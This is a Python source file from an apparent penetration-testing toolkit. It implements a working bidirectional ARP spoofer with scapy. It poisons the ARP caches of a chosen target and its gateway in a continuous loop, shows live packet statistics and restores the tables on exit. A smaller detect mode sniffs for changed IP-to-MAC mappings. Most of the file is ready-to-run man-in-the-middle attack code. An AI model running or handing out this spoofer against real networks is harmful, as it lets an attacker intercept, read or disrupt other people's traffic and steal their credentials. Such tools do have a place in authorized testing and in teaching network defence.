
# =============================================================================
# Filename   : arp_spoof.py
# Description: Bidirectional ARP spoofer with detect mode, graceful restore,
#              and live packet statistics. Part of PARALELEPIPEDO Toolkit.
# Author     : PARALELEPIPEDO Toolkit
# =============================================================================

import argparse
import signal
import sys
import time
import threading
from collections import defaultdict

from colorama import Fore, Style, init
from scapy.all import (
    ARP, Ether, srp, send, sniff, get_if_hwaddr, conf
)

init(autoreset=True)

# ---------------------------------------------------------------------------
# Globals for stats and graceful shutdown
# ---------------------------------------------------------------------------
_running        = True
_stats_lock     = threading.Lock()
_packets_sent   = 0
_bytes_sent     = 0
_start_time     = None

_target_ip      = None
_target_mac     = None
_gateway_ip     = None
_gateway_mac    = None
_iface          = None


def info(msg):
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {msg}")

def warn(msg):
    print(f"{Fore.YELLOW}[!]{Style.RESET_ALL} {msg}")

def err(msg):
    print(f"{Fore.RED}[-]{Style.RESET_ALL} {msg}")


# ---------------------------------------------------------------------------
# ARP helpers
# ---------------------------------------------------------------------------

def get_mac(ip: str, iface: str) -> str | None:
    """Send ARP who-has and return the MAC reply, or None on timeout."""
    arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(arp_req, timeout=3, iface=iface, verbose=False)
    if answered:
        return answered[0][1].hwsrc
    return None


def build_spoof_pkt(target_ip: str, target_mac: str, spoof_ip: str) -> ARP:
    """Return an ARP reply telling target that spoof_ip is at our MAC."""
    return ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)


def restore_arp(dst_ip: str, dst_mac: str, src_ip: str, src_mac: str):
    """Send correct ARP mapping to dst so it repairs its cache."""
    pkt = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    send(pkt, count=5, verbose=False)


# ---------------------------------------------------------------------------
# Stats printer thread
# ---------------------------------------------------------------------------

def stats_printer():
    global _packets_sent, _start_time
    while _running:
        time.sleep(1)
        elapsed = time.time() - _start_time
        with _stats_lock:
            pps = _packets_sent / elapsed if elapsed > 0 else 0
            print(
                f"\r{Fore.CYAN}[STATS]{Style.RESET_ALL} "
                f"Sent: {_packets_sent:>6}  |  "
                f"PPS: {pps:>6.1f}  |  "
                f"Elapsed: {int(elapsed):>4}s   ",
                end="",
                flush=True,
            )


# ---------------------------------------------------------------------------
# Signal handler
# ---------------------------------------------------------------------------

def _signal_handler(sig, frame):
    global _running
    _running = False
    print()  # newline after stats line
    if _target_mac and _gateway_mac:
        warn("Restoring ARP tables...")
        restore_arp(_target_ip, _target_mac, _gateway_ip, _gateway_mac)
        restore_arp(_gateway_ip, _gateway_mac, _target_ip, _target_mac)
        info("ARP tables restored.")
    elapsed = time.time() - _start_time if _start_time else 0
    info(f"Total packets sent: {_packets_sent}  |  Running time: {elapsed:.1f}s")
    sys.exit(0)


# ---------------------------------------------------------------------------
# Spoof loop
# ---------------------------------------------------------------------------

def spoof_loop(target_ip: str, target_mac: str,
               gateway_ip: str, gateway_mac: str,
               iface: str, interval: float):
    global _running, _packets_sent, _start_time

    conf.iface = iface
    _start_time = time.time()

    pkt_to_target  = build_spoof_pkt(target_ip, target_mac, gateway_ip)
    pkt_to_gateway = build_spoof_pkt(gateway_ip, gateway_mac, target_ip)

    t = threading.Thread(target=stats_printer, daemon=True)
    t.start()

    info(f"ARP spoofing {target_ip} <-> {gateway_ip} on {iface}")
    info("Press Ctrl+C to stop and restore ARP tables.")

    while _running:
        send(pkt_to_target,  verbose=False)
        send(pkt_to_gateway, verbose=False)
        with _stats_lock:
            _packets_sent += 2
        time.sleep(interval)


# ---------------------------------------------------------------------------
# Detect mode
# ---------------------------------------------------------------------------

_arp_table: dict[str, set] = defaultdict(set)   # ip -> set of MACs seen
_last_seen:  dict[str, str] = {}                 # ip -> last seen MAC


def _detect_callback(pkt):
    if not pkt.haslayer(ARP):
        return

    arp = pkt[ARP]
    op  = arp.op      # 1=who-has, 2=is-at
    src_ip  = arp.psrc
    src_mac = arp.hwsrc

    if src_ip == "0.0.0.0" or src_mac == "00:00:00:00:00:00":
        return

    if op == 2:  # ARP reply (is-at)
        prev_macs = _arp_table[src_ip]
        if prev_macs and src_mac not in prev_macs:
            warn(
                f"ARP SPOOF DETECTED!  IP {src_ip} "
                f"changed MAC from {list(prev_macs)[-1]} to {src_mac}"
            )
        elif not prev_macs:
            info(f"Learned: {src_ip} -> {src_mac}")
        _arp_table[src_ip].add(src_mac)
        _last_seen[src_ip] = src_mac

    # Gratuitous ARP (who-has with same src/dst IP) is also suspicious
    if op == 1 and arp.pdst == arp.psrc:
        warn(f"Gratuitous ARP from {src_ip} ({src_mac})")


def detect_mode(iface: str):
    info(f"ARP detect mode on {iface}. Sniffing... (Ctrl+C to stop)")
    try:
        sniff(iface=iface, filter="arp", prn=_detect_callback, store=False)
    except KeyboardInterrupt:
        info("Detect mode stopped.")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def parse_args():
    p = argparse.ArgumentParser(
        description="PARALELEPIPEDO Toolkit – ARP Spoofer / Detector"
    )
    p.add_argument("--target",    help="Target IP address")
    p.add_argument("--gateway",   help="Gateway IP address")
    p.add_argument("--interface", "-i", default=conf.iface, help="Network interface")
    p.add_argument("--detect",    action="store_true",
                   help="Passive ARP spoofing detection mode")
    p.add_argument("--interval",  type=float, default=2.0,
                   help="Seconds between spoof packets (default: 2)")
    return p.parse_args()


def main():
    global _target_ip, _target_mac, _gateway_ip, _gateway_mac, _iface

    args = parse_args()
    _iface = args.interface

    signal.signal(signal.SIGINT, _signal_handler)

    if args.detect:
        detect_mode(_iface)
        return

    if not args.target or not args.gateway:
        err("--target and --gateway are required for spoof mode.")
        sys.exit(1)

    _target_ip  = args.target
    _gateway_ip = args.gateway

    info(f"Resolving MAC for target  {_target_ip} ...")
    _target_mac = get_mac(_target_ip, _iface)
    if not _target_mac:
        err(f"Could not resolve MAC for {_target_ip}. Is the host up?")
        sys.exit(1)
    info(f"Target  MAC: {_target_mac}")

    info(f"Resolving MAC for gateway {_gateway_ip} ...")
    _gateway_mac = get_mac(_gateway_ip, _iface)
    if not _gateway_mac:
        err(f"Could not resolve MAC for {_gateway_ip}.")
        sys.exit(1)
    info(f"Gateway MAC: {_gateway_mac}")

    spoof_loop(_target_ip, _target_mac, _gateway_ip, _gateway_mac,
               _iface, args.interval)


if __name__ == "__main__":
    main()
